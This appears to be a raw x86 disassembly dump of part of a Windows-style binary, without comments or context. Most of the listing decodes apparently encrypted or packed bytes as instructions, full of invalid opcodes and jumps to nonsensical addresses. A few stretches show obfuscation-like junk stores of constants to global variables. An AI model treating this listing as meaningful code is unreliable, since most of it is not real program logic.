  40db36:	push   ebp
  40db37:	sbb    al,0x85
  40db39:	mov    ebp,0xd9efbefe
  40db3e:	inc    edi
  40db3f:	mov    esp,DWORD PTR ds:0x8344dbba
  40db45:	add    BYTE PTR [ebx],ch
  40db47:	inc    esp
  40db48:	push   edx
  40db49:	xor    al,0xbf
  40db4b:	pop    edi
  40db4c:	sbb    ebx,DWORD PTR [ebp-0x6086ee0f]
  40db52:	(bad)
  40db56:	dec    ebx
  40db57:	mov    al,0x47
  40db59:	(bad)
  40db5c:	(bad)  
  40db5d:	mov    edi,0x97c07566
  40db62:	pop    ebp
  40db63:	sbb    BYTE PTR [esi+ecx*8],ch
  40db66:	shl    DWORD PTR [edx+0x1a],1
  40db69:	add    ebx,DWORD PTR [edx]
  40db6b:	mov    fs,WORD PTR [ecx-0x2]
  40db6e:	or     esi,DWORD PTR [ebx-0x188228f7]
  40db74:	pop    edi
  40db75:	or     ah,BYTE PTR cs:[esi+0x3580f9f8]
  40db7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db7d:	pop    edx
  40db7e:	push   esp
  40db7f:	push   eax
  40db80:	mov    esp,0xa99adbd2
  40db85:	shr    BYTE PTR [ecx+ecx*8-0x24],1
  40db89:	call   0x47f2a523
  40db8e:	in     al,dx
  40db8f:	ss into 
  40db91:	and    al,0x5b
  40db93:	jmp    0x40db50
  40db95:	retf   0x19b8
  40db98:	jnp    0x40db25
  40db9a:	mov    WORD PTR [edi-0x37],es
  40db9d:	push   ecx
  40db9e:	pushf  
  40db9f:	mov    ch,0xa1
  40dba1:	xchg   ebx,eax
  40dba2:	test   DWORD PTR [ecx],edx
  40dba4:	mov    DWORD PTR [ecx],ebp
  40dba6:	bound  edx,QWORD PTR [ebp+ebp*1-0x10953c09]
  40dbad:	ret    
  40dbae:	cbw    
  40dbb0:	adc    al,0x4
  40dbb2:	mov    DWORD PTR [ebp-0x40],ebp
  40dbb5:	cmp    eax,ecx
  40dbb7:	jne    0x40de3d
  40dbbd:	mov    eax,DWORD PTR [ebp-0x4]
  40dbc0:	xor    eax,edi
  40dbc2:	jmp    0x40de1f
  40dbc7:	mov    edi,0x5dc09dfd
  40dbcc:	loopne 0x40dc31
  40dbce:	adc    DWORD PTR [esi+0x6740145c],0xfa6a0322
  40dbd8:	sahf   
  40dbd9:	jle    0x40dc59
  40dbdb:	ds jl  0x40dc5c
  40dbde:	jle    0x40dbd9
  40dbe0:	or     al,0x6e
  40dbe2:	dec    esi
  40dbe3:	pop    ss
  40dbe4:	out    dx,eax
  40dbe5:	inc    eax
  40dbe6:	out    0x5a,eax
  40dbe8:	push   ss
  40dbe9:	repnz sbb ebp,DWORD PTR [ebx+0xd4e95c3]
  40dbf0:	inc    ecx
  40dbf1:	outs   dx,DWORD PTR ds:[esi]
  40dbf2:	xor    DWORD PTR [ebx-0x58f0b431],0x46
  40dbf9:	cmp    ah,BYTE PTR [esi+0x56]
  40dbfc:	inc    eax
  40dbfd:	sar    BYTE PTR [ecx+0x5a],0x7b
  40dc01:	iret   
  40dc02:	int    0xc1
  40dc04:	addr16 push ebp
  40dc06:	inc    eax
  40dc07:	repnz sub esp,ecx
  40dc0a:	sub    eax,0xc0c25e61
  40dc0f:	jmp    0x4dad1659
  40dc14:	push   ebp
  40dc15:	loopne 0x40db9f
  40dc17:	jle    0x40dc3d
  40dc19:	dec    edi
  40dc1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc1b:	mov    al,ds:0xc5511cd7
  40dc20:	test   al,0xf6
  40dc22:	push   esp
  40dc23:	mov    cl,0x41
  40dc25:	ss jmp 0x40dc20
  40dc28:	ret    0xa58e
  40dc2b:	xchg   edx,eax
  40dc2c:	sub    al,dh
  40dc2e:	inc    ecx
  40dc2f:	sub    al,0x63
  40dc31:	jbe    0x40dbdf
  40dc33:	cmc    
  40dc34:	sti    
  40dc35:	popa   
  40dc36:	mov    ebp,0x9b4a3a
  40dc3b:	or     esp,0x2d7490fd
  40dc41:	dec    ecx
  40dc42:	popf   
  40dc43:	push   es
  40dc44:	mov    al,ds:0xce5e4826
  40dc49:	xchg   esp,eax
  40dc4a:	shl    DWORD PTR [ebx+0x1a2a7587],1
  40dc50:	mov    ds:0xf37d2783,eax
  40dc55:	jae    0x40dc5c
  40dc57:	mov    ebp,0x2e14a067
  40dc5c:	add    BYTE PTR [ebx+0x76],0x6
  40dc60:	ret    
  40dc61:	mov    ebp,0x9b246625
  40dc66:	jns    0x40dc9e
  40dc68:	inc    esi
  40dc69:	mov    bh,0x73
  40dc6b:	leave  
  40dc6c:	int3   
  40dc6d:	lock xor BYTE PTR [ecx+0x30aa3ab9],dl
  40dc74:	int    0x2b
  40dc76:	mov    ah,BYTE PTR [edx]
  40dc78:	add    al,0x87
  40dc7a:	mov    edx,0x17377686
  40dc7f:	scas   al,BYTE PTR es:[edi]
  40dc80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc81:	es jnp 0x40dc1f
  40dc84:	sbb    BYTE PTR [eax+ecx*2],dl
  40dc87:	retf   0xa229
  40dc8a:	or     al,0xcc
  40dc8c:	sbb    DWORD PTR [edi+0x78],edi
  40dc8f:	mov    bh,BYTE PTR [edi+0x4d]
  40dc92:	fmul   st,st(1)
  40dc94:	sbb    dh,ch
  40dc96:	jae    0x40dc35
  40dc98:	or     eax,DWORD PTR [edx+0x4e]
  40dc9b:	repnz cmp al,0x3c
  40dc9e:	push   edi
  40dc9f:	fnsave [edx-0x1e]
  40dca2:	int    0xb2
  40dca4:	cmp    eax,0x1af60e63
  40dca9:	or     dl,BYTE PTR [ebp-0x2ff7553d]
  40dcaf:	stos   DWORD PTR es:[edi],eax
  40dcb0:	stos   DWORD PTR es:[edi],eax
  40dcb1:	and    ah,BYTE PTR [ebx+0x7392b994]
  40dcb7:	leave  
  40dcb8:	and    ecx,DWORD PTR [ecx+eiz*2]
  40dcbb:	(bad)  
  40dcbc:	cmc    
  40dcbd:	jo     0x40dc67
  40dcbf:	cmp    ecx,DWORD PTR [eax+0x4aa7214e]
  40dcc5:	loop   0x40dc71
  40dcc7:	jo     0x40dd2d
  40dcc9:	stc    
  40dcca:	in     eax,dx
  40dccb:	int3   
  40dccc:	sub    ebp,ecx
  40dcce:	retf   0xe17f
  40dcd1:	rcr    BYTE PTR [edi-0x48],1
  40dcd4:	dec    ebx
  40dcd5:	inc    esp
  40dcd6:	cld    
  40dcd7:	fwait
  40dcd8:	xor    DWORD PTR [eax+0x8],0x3f
  40dcdc:	cmp    esp,DWORD PTR [ebx+0x26]
  40dcdf:	(bad)  
  40dce0:	sub    BYTE PTR ds:[edx-0x6e],bl
  40dce4:	sub    al,0xd0
  40dce6:	mov    edi,DWORD PTR [ecx+eiz*8]
  40dce9:	mov    esi,0x51f19ad
  40dcee:	push   0x59
  40dcf0:	mov    bh,0x4c
  40dcf2:	push   edx
  40dcf3:	inc    DWORD PTR [esi]
  40dcf5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dcf6:	ins    BYTE PTR es:[edi],dx
  40dcf7:	fisttp WORD PTR [edx+eax*1]
  40dcfa:	ins    DWORD PTR es:[edi],dx
  40dcfb:	mov    al,0xc6
  40dcfd:	mov    BYTE PTR [eax-0x80],bl
  40dd00:	gs data16 (bad) 
  40dd03:	push   es
  40dd04:	inc    esi
  40dd05:	add    eax,0x9081c9d1
  40dd0a:	push   es
  40dd0b:	into   
  40dd0c:	xor    ax,0xb875
  40dd10:	sub    dl,cl
  40dd12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd13:	cwde   
  40dd14:	mul    DWORD PTR [edx-0x78ed0d57]
  40dd1a:	in     eax,dx
  40dd1b:	xchg   esi,eax
  40dd1c:	ficom  DWORD PTR [ebx+0x488e8ac7]
  40dd22:	xchg   DWORD PTR [ecx-0x4df25e14],ecx
  40dd28:	inc    esi
  40dd29:	fdivr  DWORD PTR [bx+di+0x5631]
  40dd2e:	push   ecx
  40dd2f:	and    eax,0xfe0460c2
  40dd34:	jmp    0xe35b:0x398d7e3c
  40dd3b:	push   0xffffffdb
  40dd3d:	cmp    ebp,edx
  40dd3f:	cmp    eax,0xadee14e5
  40dd44:	lods   al,BYTE PTR ds:[esi]
  40dd45:	jp     0x40dd5c
  40dd47:	retf   
  40dd48:	jnp    0x40dd38
  40dd4a:	repnz mov al,ds:0x955dba55
  40dd50:	rcl    bl,0x6e
  40dd53:	fdivr  QWORD PTR [ebp+0x2a]
  40dd56:	push   0x5e
  40dd58:	xchg   esi,eax
  40dd59:	iret   
  40dd5a:	add    DWORD PTR [edx+ebp*4+0x64c063f6],0x150e6cbd
  40dd65:	imul   ebp,DWORD PTR [edx+0x66],0x35889a62
  40dd6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd6d:	neg    BYTE PTR [esi+0x3b2c8fca]
  40dd73:	push   ebx
  40dd74:	dec    ebx
  40dd75:	inc    esp
  40dd76:	daa    
  40dd77:	adc    edx,DWORD PTR [eax+ebp*8]
  40dd7a:	inc    edx
  40dd7b:	lock fadd QWORD PTR [eax-0x276c441e]
  40dd82:	sbb    al,0x3d
  40dd84:	(bad)  
  40dd85:	mov    ah,0xf1
  40dd87:	mov    WORD PTR [edx*8+0x2ad81b02],gs
  40dd8e:	add    al,0x83
  40dd90:	rcl    BYTE PTR [eax-0x1ce84a58],1
  40dd96:	mov    al,0x73
  40dd98:	test   BYTE PTR [edi+0x11c41c6b],ah
  40dd9e:	clc    
  40dd9f:	pop    ds
  40dda0:	enter  0x9f42,0xc4
  40dda4:	mov    esi,0xee8ac725
  40dda9:	lea    ecx,[ebp+0x4e2e435c]
  40ddaf:	scas   al,BYTE PTR es:[edi]
  40ddb0:	sub    eax,0x6ff7cc8d
  40ddb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ddb6:	mov    cl,BYTE PTR [eax]
  40ddb8:	add    al,0x24
  40ddba:	inc    esi
  40ddbb:	cmp    dl,cl
  40ddbd:	mov    WORD PTR [ecx],?
  40ddbf:	xor    BYTE PTR [eax-0x72],cl
  40ddc2:	mov    bh,0xe4
  40ddc4:	xchg   ecx,eax
  40ddc5:	adc    dh,bl
  40ddc7:	loop   0x40dd6a
  40ddc9:	jae    0x40de42
  40ddcb:	pop    ss
  40ddcc:	add    ecx,DWORD PTR [ecx+0x4d9bdba5]
  40ddd2:	xor    al,0x6f
  40ddd4:	lahf   
  40ddd5:	mov    ch,0xbb
  40ddd7:	pop    ds
  40ddd8:	fdivr  QWORD PTR [esi]
  40ddda:	(bad)  
  40dddb:	(bad)  
  40dddd:	dec    esp
  40ddde:	popf   
  40dddf:	out    0x63,al
  40dde1:	or     BYTE PTR [eax],bl
  40dde3:	push   es
  40dde4:	call   0xc9e7:0x4a1c09ce
  40ddeb:	adc    esp,DWORD PTR [esi+0x73]
  40ddee:	scas   al,BYTE PTR es:[edi]
  40ddef:	or     esi,DWORD PTR [ebx-0x3886eda0]
  40ddf5:	dec    esi
  40ddf6:	mov    edx,0x7f3bb826
  40ddfb:	bound  ebp,QWORD PTR [edi+eiz*4+0x7f]
  40ddff:	cli    
  40de00:	rcr    BYTE PTR [ebp+0x1bcb3fc4],1
  40de06:	dec    ebx
  40de07:	shr    DWORD PTR [ebx+0x4c],1
  40de0a:	sub    al,0x49
  40de0c:	cmp    DWORD PTR [eax+0x45],ecx
  40de0f:	mov    ebp,0xf2c58388
  40de14:	test   eax,0xc0872fbc
  40de19:	or     ecx,edi
  40de1b:	ins    DWORD PTR es:[edi],dx
  40de1c:	adc    edi,esi
  40de1e:	rol    DWORD PTR [ebx],1
  40de20:	(bad)  
  40de21:	mov    ds:0x413bb8,eax
  40de26:	mov    eax,DWORD PTR [ebp-0x4]
  40de29:	xor    eax,edi
  40de2b:	add    eax,esi
  40de2d:	mov    ds:0x413bb0,eax
  40de32:	push   DWORD PTR [ebp-0x8]
  40de35:	push   DWORD PTR [ebp-0x4]
  40de38:	call   0x40de4a
  40de3d:	mov    eax,DWORD PTR [ebp-0x4]
  40de40:	xor    eax,edi
  40de42:	pop    edi
  40de43:	add    eax,esi
  40de45:	pop    esi
  40de46:	leave  
  40de47:	ret    0xc
  40de4a:	push   ebp
  40de4b:	mov    ebp,esp
  40de4d:	sub    esp,0x60
  40de50:	and    DWORD PTR ds:0x43371f,0x0
  40de5a:	mov    eax,ds:0x43371f
  40de5f:	inc    eax
  40de60:	mov    ds:0x43371f,eax
  40de65:	cmp    DWORD PTR ds:0x43371f,0x27
  40de6c:	jne    0x40de7e
  40de72:	push   DWORD PTR [ebp-0xc]
  40de75:	push   DWORD PTR [ebp-0x10]
  40de78:	call   DWORD PTR ds:0x4120e8
  40de7e:	cmp    DWORD PTR ds:0x43371f,0x19
  40de85:	jb     0x40de5a
  40de8b:	xor    DWORD PTR ds:0x43376f,0x6001
  40de95:	jmp    0x40dfce
  40de9a:	push   ecx
  40de9c:	inc    ebp
  40de9d:	jb     0x40df10
  40de9f:	jb     0x40de4a
  40dea1:	icebp  
  40dea2:	fisubr WORD PTR [esi]
  40dea4:	into   
  40dea5:	neg    DWORD PTR [edx+ebp*8-0x28]
  40dea9:	or     bh,BYTE PTR [edx+0x127e7e9c]
  40deaf:	jg     0x40df2f
  40deb1:	jle    0x40dec0
  40deb3:	add    BYTE PTR [ecx+0x45f5cdf1],dl
  40deb9:	xchg   esp,eax
  40deba:	cs (bad) 
  40debc:	fisttp QWORD PTR [ecx+ecx*1-0x6f9ccd0f]
  40dec3:	rcr    DWORD PTR [edi],cl
  40dec5:	pxor   mm7,QWORD PTR [ecx]
  40dec8:	in     eax,0x68
  40deca:	arpl   WORD PTR [edi],bp
  40decc:	(bad)  
  40decd:	(bad)  
  40dece:	and    esp,DWORD PTR [ebx+0x7d]
  40ded1:	(bad)  [edi-0x6a39155b]
  40ded7:	inc    edx
  40ded8:	lock ins BYTE PTR es:[edi],dx
  40deda:	or     dl,BYTE PTR [esi-0x1c]
  40dedd:	scas   al,BYTE PTR es:[edi]
  40dede:	and    esp,DWORD PTR [ebx]
  40dee0:	fimul  DWORD PTR [eax+0x70]
  40dee3:	fild   DWORD PTR [ebx]
  40dee5:	mov    esi,0x5ba285c9
  40deea:	clc    
  40deeb:	outs   dx,BYTE PTR ds:[esi]
  40deec:	(bad)  
  40deed:	shr    DWORD PTR [esi-0x4e4321c2],cl
  40def3:	bound  eax,QWORD PTR [ebp-0x6e77c922]
  40def9:	sti    
  40defa:	adc    al,0xc8
  40defc:	or     BYTE PTR [eax+ecx*4],dh
  40deff:	out    0x3f,eax
  40df01:	dec    esi
  40df02:	jl     0x40dea0
  40df04:	push   eax
  40df05:	mov    dl,0xe3
  40df07:	repz mov bh,bh
  40df0a:	pop    ecx
  40df0b:	jg     0x40def9
  40df0d:	push   ecx
  40df0e:	jnp    0x40df7b
  40df10:	and    al,0x6a
  40df12:	adc    BYTE PTR [edi-0x63f8dbf7],dl
  40df18:	inc    ebx
  40df19:	stc    
  40df1a:	in     eax,dx
  40df1b:	lea    eax,[edx+0x68627f8d]
  40df21:	(bad)  
  40df22:	inc    cx
  40df24:	mov    ecx,0x7c9864ab
  40df29:	mov    ebx,DWORD PTR [esp+edx*2]
  40df2c:	fwait
  40df2d:	pop    esi
  40df2e:	pop    edx
  40df2f:	int3   
  40df30:	pop    esp
  40df31:	cmp    DWORD PTR [ecx],0xffffffab
  40df34:	loop   0x40df61
  40df36:	lods   al,BYTE PTR ds:[esi]
  40df37:	add    al,0x4f
  40df39:	jl     0x40df6a
  40df3b:	mov    esp,0xa4c56c61
  40df40:	inc    eax
  40df41:	push   ebp
  40df42:	test   BYTE PTR [esi-0xa3ebd1f],bh
  40df48:	data16 stos BYTE PTR es:[edi],al
  40df4a:	enter  0x5d37,0xc9
  40df4e:	push   esi
  40df4f:	mov    BYTE PTR [ecx-0x68],bh
  40df52:	fcomp  st(5)
  40df54:	xchg   edx,eax
  40df55:	push   ss
  40df56:	and    BYTE PTR [eax+0x22],dl
  40df59:	cmp    eax,0x48e9a135
  40df5e:	fs in  eax,0x9d
  40df61:	es and edx,ebx
  40df64:	ss pop ecx
  40df66:	in     eax,0x96
  40df68:	sbb    esi,DWORD PTR [ebx+ebx*1-0x6b515ace]
  40df6f:	ficomp WORD PTR [esi+ebx*1+0x6d]
  40df73:	scas   al,BYTE PTR es:[edi]
  40df74:	add    dh,dl
  40df76:	xchg   ah,dl
  40df78:	js     0x40df7e
  40df7a:	pop    esp
  40df7b:	das    
  40df7c:	lods   eax,DWORD PTR ds:[esi]
  40df7d:	shl    BYTE PTR [edi-0x9],1
  40df80:	inc    ebx
  40df81:	mov    WORD PTR [esp+edx*4-0x2b],es
  40df85:	jp     0x40df31
  40df87:	stos   BYTE PTR es:[edi],al
  40df88:	push   ecx
  40df89:	sbb    al,BYTE PTR [ebp+0x75]
  40df8c:	sub    BYTE PTR [ebp+0x42],0x38
  40df90:	pop    eax
  40df91:	push   0x1a7a2c3d
  40df96:	push   ebx
  40df97:	adc    ebx,DWORD PTR [esi-0x80]
  40df9a:	pop    edx
  40df9b:	retf   0x35e0
  40df9e:	adc    BYTE PTR [edx+0x6f],bl
  40dfa1:	lods   eax,DWORD PTR ds:[esi]
  40dfa2:	sub    esi,DWORD PTR [eax+0x45]
  40dfa5:	mov    dh,0x5f
  40dfa7:	out    dx,eax
  40dfa8:	fwait
  40dfa9:	rol    bl,cl
  40dfab:	out    dx,eax
  40dfac:	test   esi,ecx
  40dfae:	cwde   
  40dfaf:	(bad)  
  40dfb1:	and    DWORD PTR [ecx+edx*8-0x63],ebp
  40dfb5:	nop
  40dfb6:	xchg   ebx,eax
  40dfb7:	pop    gs
  40dfb9:	lds    ebp,FWORD PTR ds:0x3d59d89c
  40dfbf:	lock fdiv DWORD PTR [edi+0x48]
  40dfc3:	pop    ebp
  40dfc4:	je     0x40df7c
  40dfc6:	je     0x40e032
  40dfc8:	cmp    BYTE PTR [ebx+0x63],al
  40dfcb:	dec    eax
  40dfcc:	inc    ecx
  40dfcd:	dec    BYTE PTR [ebx+0x2d810845]
  40dfd3:	pop    ss
  40dfd4:	aaa    
  40dfd5:	inc    ebx
  40dfd6:	add    BYTE PTR ds:0x53000006,ah
  40dfdc:	sub    DWORD PTR ds:0x43376b,0x540f
  40dfe6:	push   esi
  40dfe7:	or     ebx,0x36b6
  40dfed:	mov    esi,0x7510854
  40dff2:	jmp    0x40e12b
  40dff7:	cmp    BYTE PTR [ebx-0x678ee5cf],dh
  40dffd:	shl    DWORD PTR [ecx+0x78],1
  40e000:	xor    esi,ecx
  40e002:	stos   BYTE PTR es:[edi],al
  40e003:	lods   eax,DWORD PTR ds:[esi]
  40e004:	or     DWORD PTR [ebp+0x7e9d5efc],ecx
  40e00a:	jle    0x40e01e
  40e00c:	jg     0x40e08c
  40e00e:	jle    0x40dfeb
  40e010:	xor    DWORD PTR [ebp-0x51],ecx
  40e013:	aad    0x5d
  40e015:	jmp    0x40e02c
  40e017:	adc    eax,0xf6c50331
  40e01c:	leave  
  40e01d:	fbld   TBYTE PTR [edi]
  40e01f:	and    ecx,DWORD PTR [edx]
  40e021:	add    cl,dh
  40e023:	in     eax,0xda
  40e025:	cmp    eax,DWORD PTR [eax-0x34c8d2b2]
  40e02b:	or     DWORD PTR [ebx+0x317f2fba],0x30
  40e032:	scas   eax,DWORD PTR es:[edi]
  40e033:	xchg   edx,eax
  40e034:	adc    BYTE PTR [edx-0x7b],bl
  40e037:	xchg   edi,eax
  40e038:	adc    eax,0x381f0e86
  40e03d:	aaa    
  40e03e:	imul   DWORD PTR [edi+edx*8]
  40e041:	adc    DWORD PTR [esi-0x1b60059],0x42
  40e048:	pop    ebx
  40e049:	mov    dl,0x9d
  40e04b:	push   ss
  40e04c:	test   al,0x42
  40e04e:	mov    ebp,DWORD PTR [edi-0x2b]
  40e051:	imul   edx,DWORD PTR [eax-0x46],0xbc3ef365
  40e058:	lods   al,BYTE PTR ds:[esi]
  40e059:	data16 push di
  40e05c:	shl    DWORD PTR [ebx],1
  40e05e:	fs xchg ecx,eax
  40e060:	not    bh
  40e062:	xor    DWORD PTR [edx],ecx
  40e064:	test   eax,0xfedbdb8f
  40e069:	sbb    eax,ebx
  40e06b:	js     0x40e031
  40e06d:	inc    ecx
  40e06e:	xchg   esi,eax
  40e06f:	and    edi,0x7
  40e072:	push   edi
  40e073:	xor    DWORD PTR [edx-0x352e991c],ebx
  40e079:	cmc    
  40e07a:	inc    BYTE PTR [edx+ebx*4+0x32]
  40e07e:	pusha  
  40e07f:	arpl   WORD PTR [edi-0x4fd85ab5],bx
  40e085:	adc    esi,DWORD PTR [esp+esi*1-0x6b]
  40e089:	xor    DWORD PTR ds:0xef74ae32,edi
  40e08f:	repnz adc eax,0xa8462592
  40e095:	jge    0x40e080
  40e097:	out    dx,al
  40e098:	sbb    dl,BYTE PTR [ebx]
  40e09a:	pop    es
  40e09b:	ret    0xa02d
  40e09e:	push   eax
  40e09f:	pusha  
  40e0a0:	je     0x40e092
  40e0a2:	or     al,BYTE PTR [esi-0x26817f04]
  40e0a8:	cmp    edi,edi
  40e0aa:	push   eax
  40e0ab:	jl     0x40e098
  40e0ad:	mov    esi,0xd0da42d8
  40e0b2:	clc    
  40e0b3:	aad    0x94
  40e0b5:	jmp    DWORD PTR [esi+eax*1]
  40e0b8:	dec    edx
  40e0b9:	(bad)  [ebx]
  40e0bb:	mov    ss,ebp
  40e0bd:	add    eax,0x3c7c9f8e
  40e0c2:	js     0x40e0d9
  40e0c4:	sti    
  40e0c5:	pop    esp
  40e0c6:	jge    0x40e0e7
  40e0c8:	cmp    dl,BYTE PTR [ebx+edi*8+0x4915958a]
  40e0cf:	call   0xcec6:0xb96a80c4
  40e0d6:	xchg   ebp,eax
  40e0d7:	add    dl,dl
  40e0d9:	shr    DWORD PTR [ecx],1
  40e0db:	or     edi,ecx
  40e0dd:	xchg   ah,bl
  40e0df:	retf   
  40e0e0:	dec    edx
  40e0e1:	mov    eax,ds:0xbe9b80e1
  40e0e6:	(bad)  
  40e0e8:	sbb    edi,DWORD PTR [edi-0x31]
  40e0eb:	pop    es
  40e0ec:	icebp  
  40e0ed:	fs popa 
  40e0ef:	push   ss
  40e0f0:	inc    ebp
  40e0f1:	aam    0x46
  40e0f3:	lods   al,BYTE PTR ds:[esi]
  40e0f4:	pop    ebx
  40e0f5:	clc    
  40e0f6:	loope  0x40e09b
  40e0f8:	int3   
  40e0f9:	xor    DWORD PTR [ebp+0x55],edi
  40e0fc:	fmul   QWORD PTR [esi+0x51]
  40e0ff:	daa    
  40e100:	fisubr DWORD PTR [edi+0x74]
  40e103:	aam    0x85
  40e105:	fidivr WORD PTR [ebp+esi*8+0x361f8f38]
  40e10c:	xchg   BYTE PTR ds:[eax],dh
  40e10f:	mov    bh,0x5d
  40e111:	and    ecx,eax
  40e113:	jo     0x40e0cc
  40e115:	les    edx,FWORD PTR [edx+0x4e2b7437]
  40e11b:	mov    eax,ds:0x1ba1a8e7
  40e120:	stc    
  40e121:	(bad)  
  40e122:	les    edi,FWORD PTR [eax-0x399b6849]
  40e128:	and    eax,0xc6336906
  40e12d:	adc    DWORD PTR ds:0x433723,0x2097
  40e137:	mov    ebx,0x32729b
  40e13c:	xor    DWORD PTR ds:0x43376f,0x2259
  40e146:	add    eax,ebx
  40e148:	push   edi
  40e149:	jmp    0x40e282
  40e14e:	pop    ebx
  40e14f:	jecxz  0x40e12d
  40e151:	call   0x71acd2ba
  40e156:	and    ecx,DWORD PTR [eax]
  40e158:	out    0xd3,al
  40e15a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e15b:	cwde   
  40e15c:	dec    sp
  40e15e:	jb     0x40e0fa
  40e160:	jle    0x40e1e0
  40e162:	adc    bh,BYTE PTR [edi+0x7e]
  40e165:	jle    0x40e13c
  40e167:	jae    0x40e155
  40e169:	mov    edi,0x5e27d30
  40e16e:	inc    ebx
  40e16f:	push   ebx
  40e170:	mov    esi,DWORD PTR [edi-0x644312e7]
  40e176:	or     al,BYTE PTR [eax-0x3a]
  40e179:	ss dec esi
  40e17b:	aaa    
  40e17c:	fst    DWORD PTR [ebp+0x34]
  40e17f:	jae    0x40e1a6
  40e181:	pop    edx
  40e182:	or     DWORD PTR [edi-0x37975f35],edx
  40e188:	or     ecx,DWORD PTR [esi-0x27ce4d07]
  40e18e:	fwait
  40e18f:	pop    esp
  40e190:	inc    esp
  40e191:	cmp    ch,BYTE PTR [eax+0x3]
  40e194:	mov    DWORD PTR [esi],esi
  40e196:	add    BYTE PTR [ebp+0x2],bl
  40e199:	sub    eax,0xd53dc30b
  40e19e:	push   eax
  40e19f:	aam    0x74
  40e1a1:	and    al,0x1
  40e1a3:	test   DWORD PTR [ebp-0x67],esi
  40e1a6:	aas    
  40e1a7:	inc    ecx
  40e1a8:	int    0x41
  40e1aa:	lock pop esp
  40e1ac:	pop    edi
  40e1ad:	and    BYTE PTR [edi-0xa2388b],bl
  40e1b3:	imul   WORD PTR [ebp-0x513ce7e0]
  40e1ba:	popf   
  40e1bb:	jge    0x40e164
  40e1bd:	mov    dh,0x17
  40e1bf:	(bad)  
  40e1c1:	inc    esi
  40e1c2:	add    al,0x72
  40e1c4:	jle    0x40e174
  40e1c6:	cmp    dl,cl
  40e1c8:	popf   
  40e1c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1ca:	xor    eax,0xb958737d
  40e1cf:	in     al,0x81
  40e1d1:	mov    ?,ecx
  40e1d3:	mov    edi,DWORD PTR [ebp-0x7f6b5c47]
  40e1d9:	iret   
  40e1da:	stos   DWORD PTR es:[edi],eax
  40e1db:	add    al,0x27
  40e1dd:	test   DWORD PTR [ecx-0x20776f4],0x3dea53d5
  40e1e7:	rol    DWORD PTR [ecx-0x2a416c8c],1
  40e1ed:	xchg   BYTE PTR [esi+edi*1],dl
  40e1f0:	mov    al,ds:0x5bce354e
  40e1f5:	aam    0xdd
  40e1f7:	xor    bl,ah
  40e1f9:	pop    esi
  40e1fa:	inc    ebp
  40e1fb:	pop    ebp
  40e1fc:	imul   eax,edi,0x52e546cd
  40e202:	out    0xbb,eax
  40e204:	stos   BYTE PTR es:[edi],al
  40e205:	in     eax,dx
  40e206:	int3   
  40e207:	jmp    0x40e1b2
  40e209:	sbb    DWORD PTR [eax+0x3d],esi
  40e20c:	test   eax,0xebef98e7
  40e211:	adc    BYTE PTR [ebp+0x6d00e12a],0x49
  40e218:	push   edi
  40e219:	cmp    dl,dh
  40e21b:	push   0x450b5081
  40e220:	sub    al,BYTE PTR [eax-0x35]
  40e223:	jae    0x40e22d
  40e225:	cli    
  40e226:	ret    
  40e227:	test   eax,0x1e744f9b
  40e22c:	sub    eax,0x39861868
  40e231:	xor    BYTE PTR [ecx-0x1f],bh
  40e234:	mov    al,0x62
  40e236:	pop    ebx
  40e237:	dec    ebx
  40e238:	neg    DWORD PTR [edx+0x1ff6937a]
  40e23e:	jne    0x40e29e
  40e240:	jmp    0x285b1d0d
  40e245:	xchg   BYTE PTR [ebp+0xa6402c7],ch
  40e24b:	test   edx,ebp
  40e24d:	fiadd  WORD PTR [esi+0x38]
  40e250:	loop   0x40e1f9
  40e252:	(bad)  [esi]
  40e254:	pop    ds
  40e255:	in     eax,dx
  40e256:	(bad)  
  40e257:	sahf   
  40e258:	cmp    eax,ebp
  40e25a:	sbb    BYTE PTR ds:0x85c9fc18,0x20
  40e261:	xchg   esp,eax
  40e262:	data16 loop 0x40e255
  40e265:	pushf  
  40e266:	inc    edx
  40e267:	jae    0x40e261
  40e269:	xchg   edx,eax
  40e26a:	adc    BYTE PTR [esi-0x39],al
  40e26d:	push   esi
  40e26e:	daa    
  40e26f:	(bad)  
  40e270:	jno    0x40e223
  40e272:	scas   eax,DWORD PTR es:[edi]
  40e273:	popa   
  40e274:	mov    bh,0x73
  40e276:	lahf   
  40e277:	mov    DWORD PTR [esi],esi
  40e279:	jmp    0xd86a5a74
  40e27e:	sub    ebx,0x45894ae4
  40e284:	call   0xff496014
  40e289:	add    eax,0x43368b
  40e28e:	xor    edi,esi
  40e290:	add    DWORD PTR ds:0x433763,0x2783
  40e29a:	mov    DWORD PTR [ebp-0xc],0xf89c85f1
  40e2a1:	mov    DWORD PTR [ebp-0x10],0xf89c8731
  40e2a8:	dec    DWORD PTR ds:0x4337ab
  40e2ae:	add    edi,ebx
  40e2b0:	mov    DWORD PTR ds:0x433717,0x5e0d
  40e2ba:	jmp    0x40e83c
  40e2bf:	cmp    edi,0x40
  40e2c2:	jne    0x40e31a
  40e2c8:	movzx  eax,BYTE PTR ds:0x43368b
  40e2cf:	mov    eax,ds:0x4139b4
  40e2d4:	mov    eax,DWORD PTR [eax]
  40e2d6:	mov    DWORD PTR ds:0x433757,0x3f94
  40e2e0:	mov    DWORD PTR [ebp-0x14],eax
  40e2e3:	mov    DWORD PTR ds:0x43371f,0x877
  40e2ed:	mov    eax,ds:0x413bbc
  40e2f2:	mov    DWORD PTR ds:0x43369b,0x4b6e
  40e2fc:	mov    eax,DWORD PTR [eax]
  40e2fe:	mov    DWORD PTR ds:0x43379f,0x73ce
  40e308:	mov    DWORD PTR [ebp-0x18],eax
  40e30b:	mov    DWORD PTR ds:0x4337ab,0x7077
  40e315:	jmp    0x40e830
  40e31a:	mov    DWORD PTR ds:0x43375f,0xab2
  40e324:	cmp    edi,0x33d
  40e32a:	mov    DWORD PTR ds:0x43379b,0x48b4
  40e334:	jne    0x40e3b3
  40e33a:	xor    DWORD PTR ds:0x433757,0x79d9
  40e344:	and    DWORD PTR [ebp+0x8],0x0
  40e348:	mov    eax,DWORD PTR [ebp-0x8]
